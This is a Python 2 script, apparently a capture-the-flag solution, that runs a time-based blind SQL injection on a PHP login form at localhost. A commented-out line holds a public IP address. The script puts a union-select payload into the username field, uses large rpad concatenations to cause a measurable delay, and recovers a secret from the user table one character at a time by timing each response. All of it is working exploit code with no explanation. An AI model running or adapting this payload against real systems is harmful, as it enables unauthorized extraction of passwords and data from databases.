import requests
import string
import time

#url='http://39.97.227.64:52105/'
url = "http://localhost:7000/index.php"
s=requests.session()

table='~!@#$%^&*()_+-=`,.?/";:<>[]{}|'+string.ascii_letters+string.digits

delay_time=0.5

flag=''
for i in range(1,65):
    succ=0
    for j in table:
        username="admin' union (select concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) from user where mid((select g.1 from (select * from (select 1)a,(select 2)b union select * from user)g limit 0,1),%d,1)='%s') #" % (i,j)
        payload={'username':username,'password':'a'}
        while True:
            try:
                time1=time.time()
                r=s.post(url,data=payload,timeout=8)
                time2=time.time()
                break
            except:
                continue
        offset=time2-time1
        print i,j,offset
        if offset>delay_time:
            flag+=j
            succ=1
            break
    print flag
    if succ==1: continue